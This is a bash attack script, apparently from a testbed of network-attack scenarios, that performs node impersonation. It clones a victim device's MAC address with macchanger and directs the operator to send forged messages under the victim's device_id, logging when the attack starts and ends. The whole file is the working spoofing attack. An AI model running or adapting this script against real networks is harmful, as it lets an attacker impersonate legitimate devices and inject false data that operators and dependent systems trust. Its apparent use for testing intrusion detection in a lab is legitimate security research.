#!/bin/bash
# Scenario 4: Node Impersonation — clone a device's MAC + reuse its
# device_id to send conflicting messages onto the network.
# Usage: ./node_impersonation.sh <interface> <victim_mac> <duration_sec>
set -e
IFACE="${1:?interface required}"
VICTIM_MAC="${2:?victim_mac required}"
DURATION="${3:-30}"

python3 -c "from logger import log_event; log_event('node_impersonation', 'attack_start', victim_mac='$VICTIM_MAC')"

sudo ifconfig "$IFACE" down
sudo macchanger -m "$VICTIM_MAC" "$IFACE"
sudo ifconfig "$IFACE" up

echo "Interface $IFACE now spoofing MAC $VICTIM_MAC for ${DURATION}s"
echo "Run your fake-device sender script here to emit messages under"
echo "the victim's device_id (reuse false_injection.py with victim's id)."
sleep "$DURATION"

python3 -c "from logger import log_event; log_event('node_impersonation', 'attack_end')"
